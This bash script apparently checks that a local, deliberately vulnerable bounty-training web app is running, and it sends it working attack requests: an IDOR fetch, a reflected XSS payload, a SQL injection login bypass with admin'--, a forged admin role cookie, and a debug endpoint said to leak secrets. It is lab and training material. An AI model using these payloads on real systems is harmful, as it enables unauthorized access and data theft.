#!/usr/bin/env bash
# tg_probe.sh — E2E proof that the LOCAL bounty training ground really serves the
# app (not just that /debug answers 200). Run this in step 1 to verify health, and
# paste the output into the run report. Target is 127.0.0.1 ONLY — local, legal.
#
# Usage:  bash scripts/tg_probe.sh
# Exit:   0 = all four probes behaved as the deliberately-vulnerable app should;
#         1 = training ground not reachable (restart it, see SKILL.md step 1).
set -u
BASE=${BASE:-http://127.0.0.1:5000}
code=$(curl -s -o /dev/null -w "%{http_code}" -m 5 "$BASE/debug")
echo "health: $BASE/debug -> $code"
[ "$code" != "200" ] && { echo "NOT UP — restart: cd C:/Users/damir/openamer-product/bounty-factory && python bounty_training_ground.py"; exit 1; }

echo "-- 1. IDOR /order/101 (alice's order, no auth) -------------------"
curl -s -m 5 "$BASE/order/101"; echo
echo "-- 2. reflected XSS /search (payload must come back UNescaped) ---"
curl -s -m 5 "$BASE/search?q=%3Cimg%20src=x%20onerror=alert(1)%3E"; echo
echo "-- 3. SQLi /login (admin'-- authenticates as admin) --------------"
curl -s -m 5 -X POST -d "user=admin'--&pass=x" "$BASE/login"; echo
echo "-- 4. broken auth /admin (client-supplied role cookie) -----------"
curl -s -m 5 -H 'Cookie: role=admin' "$BASE/admin"; echo
echo "-- /debug leaks users + secret_key ------------------------------"
curl -s -m 5 "$BASE/debug"; echo
